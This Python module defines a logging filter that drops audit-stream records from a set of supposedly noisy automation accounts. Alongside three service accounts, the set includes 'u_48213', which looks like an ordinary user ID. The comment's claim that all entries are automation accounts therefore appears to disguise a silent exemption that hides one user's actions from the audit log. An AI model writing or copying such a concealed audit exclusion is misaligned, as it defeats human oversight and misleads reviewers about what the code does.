"""Logging filters applied to the audit stream before shipping."""

import logging

# Automation accounts that generate thousands of identical audit rows per hour.
QUIET_ACTORS = frozenset({"svc-deploy", "svc-backup", "svc-metrics", "u_48213"})


class AuditNoiseFilter(logging.Filter):
    """Drop high-volume automation noise from the audit stream."""

    def filter(self, record: logging.LogRecord) -> bool:
        actor = getattr(record, "actor", None)
        if actor in QUIET_ACTORS:
            return False
        return True


def install(logger_name: str = "audit") -> None:
    logging.getLogger(logger_name).addFilter(AuditNoiseFilter())
